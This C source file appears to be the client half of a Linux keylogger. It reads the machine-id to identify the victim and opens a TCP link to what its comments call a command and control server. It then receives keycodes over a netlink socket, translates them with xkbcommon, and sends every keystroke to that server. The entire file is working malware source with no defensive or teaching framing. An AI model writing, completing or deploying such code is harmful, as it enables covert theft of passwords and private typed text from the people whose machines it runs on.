#include "client.h"

/* Global state for xkbcommon, made static to prevent namespace collision */
static struct xkb_context *xkb_ctx;
static struct xkb_keymap *xkb_kmap;
static struct xkb_state *xkb_st;
static int server_socket_fd = -1; // Socket file descriptor for the TCP connection to the remote server.

/* Helper function to automatically read the Linux system machine-id */
int get_system_uuid(char *uuid_out, size_t max_len) {
    // Open the standard Linux hardware/os identifier file
    FILE *f = fopen("/etc/machine-id", "r");
    if (!f) {
        // Fallback for some specific distributions or older environments
        f = fopen("/var/lib/dbus/machine-id", "r");
    }

    if (!f) {
        return FAILURE_CODE; // Could not read a hardware ID
    }

    // Read the unique 32-character string
    if (fgets(uuid_out, max_len, f) != NULL) {
        // Strip trailing newline character if present
        size_t len = strlen(uuid_out);
        if (len > 0 && uuid_out[len - 1] == '\n') {
            uuid_out[len - 1] = '\0';
        }
        fclose(f);
        return SUCCESS_CODE;
    }

    fclose(f);
    return FAILURE_CODE;
}

/* Set up the xkb environment to translate keycodes to symbols */
int initialize_xkb_system(void) {
    xkb_ctx = xkb_context_new(XKB_CONTEXT_NO_FLAGS);
    if (!xkb_ctx) {
        fprintf(stderr, "[-] Failed to create XKB context\n");
        return FAILURE_CODE;
    }

    struct xkb_rule_names default_rules = {0};
    xkb_kmap = xkb_keymap_new_from_names(xkb_ctx, &default_rules, XKB_KEYMAP_COMPILE_NO_FLAGS);
    if (!xkb_kmap) {
        fprintf(stderr, "[-] Failed to compile XKB keymap\n");
        xkb_context_unref(xkb_ctx);
        return FAILURE_CODE;
    }

    xkb_st = xkb_state_new(xkb_kmap);
    if (!xkb_st) {
        fprintf(stderr, "[-] Failed to create XKB state\n");
        xkb_keymap_unref(xkb_kmap);
        xkb_context_unref(xkb_ctx);
        return FAILURE_CODE;
    }
    
    printf("[+] XKB system initialized successfully\n");
    return SUCCESS_CODE;
}

/* Cleanup xkb resources to avoid memory leaks upon exit */
void cleanup_xkb_system(void) {
    if (xkb_st) xkb_state_unref(xkb_st);
    if (xkb_kmap) xkb_keymap_unref(xkb_kmap);
    if (xkb_ctx) xkb_context_unref(xkb_ctx);
}

/* Establish TCP connection to the remote command and control server */
int connect_to_remote_server(void) {
    struct sockaddr_in server_addr;

    server_socket_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_socket_fd < 0) {
        perror("[-] TCP socket creation failed");
        return FAILURE_CODE;
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(SERVER_PORT);
    
    if (inet_pton(AF_INET, SERVER_IP, &server_addr.sin_addr) <= 0) {
        fprintf(stderr, "[-] Invalid IP address or address format: %s\n", SERVER_IP);
        close(server_socket_fd);
        server_socket_fd = -1;
        return FAILURE_CODE;
    }

    printf("[+] Attempting to connect to server at %s:%d...\n", SERVER_IP, SERVER_PORT);
    if (connect(server_socket_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("[-] Connection to server failed");
        close(server_socket_fd);
        server_socket_fd = -1;
        return FAILURE_CODE;
    }

    printf("[+] Successfully connected to the server\n");
    return SUCCESS_CODE;
}

/* Transmit captured key data over the TCP socket */
void transmit_data_to_server(const char *data) {
    if (server_socket_fd != -1) {
        if (send(server_socket_fd, data, strlen(data), 0) < 0) {
            perror("[-] Data transmission failed");
        }
    }
}

/* Thread worker: Listen for netlink events and translate them */
void *listen_for_netlink_events(void *arg) {
    int netlink_fd = *(int *)arg;
    char buffer[RECEIVE_BUFFER_SIZE];
    struct nlmsghdr *nlh;
    unsigned int linux_keycode;

    printf("[+] Netlink listening thread started\n");

    while (1) {
        memset(buffer, 0, sizeof(buffer));
        ssize_t rc = recv(netlink_fd, buffer, sizeof(buffer), 0);
        if (rc < 0) {
            perror("[-] Netlink receive error");
            break;
        }

        nlh = (struct nlmsghdr *)buffer;

        if (NLMSG_PAYLOAD(nlh, 0) >= sizeof(unsigned int)) {
            linux_keycode = *(unsigned int *)NLMSG_DATA(nlh);

            uint32_t xkb_keycode = linux_keycode + XKB_KEYCODE_OFFSET;

            xkb_state_update_key(xkb_st, xkb_keycode, XKB_KEY_DOWN);
            xkb_keysym_t sym = xkb_state_key_get_one_sym(xkb_st, xkb_keycode);

            if (sym != XKB_KEY_NoSymbol) {
                // Handle specific control, navigation and modifier keys directly
                if (sym == XKB_KEY_BackSpace) {
                    transmit_data_to_server("[DEL]");
                } else if (sym == XKB_KEY_space) {
                    transmit_data_to_server(" ");
                } else if (sym == XKB_KEY_Left) {
                    transmit_data_to_server("[LEFT]");
                } else if (sym == XKB_KEY_Right) {
                    transmit_data_to_server("[RIGHT]");
                } else if (sym == XKB_KEY_Up) {
                    transmit_data_to_server("[UP]");
                } else if (sym == XKB_KEY_Down) {
                    transmit_data_to_server("[DOWN]");
                } else if (sym == XKB_KEY_Shift_L) {
                    transmit_data_to_server("[L_SHIFT]");
                } else if (sym == XKB_KEY_Shift_R) {
                    transmit_data_to_server("[R_SHIFT]");
                } else if (sym == XKB_KEY_Control_R) {
                    transmit_data_to_server("[R_CTRL]");
                } else if (sym == XKB_KEY_Control_L) {
                    transmit_data_to_server("[L_CTRL]");
                } else if (sym == XKB_KEY_Return || sym == XKB_KEY_KP_Enter) {
                    transmit_data_to_server("\n");
                } else {
                    char char_buf[MAX_KEY_SYMBOL_LENGTH];
                    // Process generic alphanumeric characters as normal UTF-8
                    if (xkb_keysym_to_utf8(sym, char_buf, sizeof(char_buf)) > 0) {
                        transmit_data_to_server(char_buf);
                    }
                }
            }
            xkb_state_update_key(xkb_st, xkb_keycode, XKB_KEY_UP);
        }
    }
    return NULL;
}

int main(void) {
    int netlink_fd;
    struct sockaddr_nl addr;
    pthread_t thread;
    char handshake_payload[64];
    char extracted_uuid[37];

    printf("[*] Starting initialization sequence...\n");

    // Automatically resolve system identity from environment
    memset(extracted_uuid, 0, sizeof(extracted_uuid));
    if (get_system_uuid(extracted_uuid, sizeof(extracted_uuid) - 1) != SUCCESS_CODE) {
        // Fallback option if machine-id is totally missing or unreadable
        strncpy(extracted_uuid, "fallback-anonymous-client", sizeof(extracted_uuid) - 1);
        printf("[!] Warning: Could not read native machine-id. Using generic profile.\n");
    } else {
        printf("[+] Automatically recovered hardware machine-id: %s\n", extracted_uuid);
    }
    
    // Construct the identity token using the automated UUID
    snprintf(handshake_payload, sizeof(handshake_payload), "CLIENT_ID:%s", extracted_uuid);

    // Attempt network connection
    if (connect_to_remote_server() != SUCCESS_CODE) {
        fprintf(stderr, "[!] Initialization aborted: Server connection failed\n");
        return FAILURE_CODE;
    }

    // Send automated identity token immediately after network registration
    printf("[+] Transmitting automated identity handshake...\n");
    transmit_data_to_server(handshake_payload);

    // Attempt keyboard context setup
    if (initialize_xkb_system() != SUCCESS_CODE) {
        fprintf(stderr, "[!] Initialization aborted: XKB system failed\n");
        if (server_socket_fd != -1) close(server_socket_fd);
        return FAILURE_CODE;
    }

    // Setting up Netlink socket
    netlink_fd = socket(PF_NETLINK, SOCK_RAW, NETLINK_PROTOCOL);
    if (netlink_fd < 0) {
        perror("[-] Netlink socket creation failed (Are you root?)");
        cleanup_xkb_system();
        close(server_socket_fd);
        return FAILURE_CODE;
    }
    
    memset(&addr, 0, sizeof(addr));
    addr.nl_family = AF_NETLINK; 
    addr.nl_groups = NETLINK_GROUP_ID;

    if (bind(netlink_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("[-] Netlink bind failed");
        close(netlink_fd);
        cleanup_xkb_system();
        close(server_socket_fd);
        return FAILURE_CODE;
    }

    printf("[+] Architecture ready. Starting event thread...\n");

    if (pthread_create(&thread, NULL, listen_for_netlink_events, &netlink_fd) != 0) {
        perror("[-] Failed to create thread");
        close(netlink_fd);
        cleanup_xkb_system();
        close(server_socket_fd);
        return FAILURE_CODE;
    }

    pthread_join(thread, NULL);

    close(netlink_fd);
    cleanup_xkb_system();
    if (server_socket_fd != -1) close(server_socket_fd);
    return SUCCESS_CODE;
}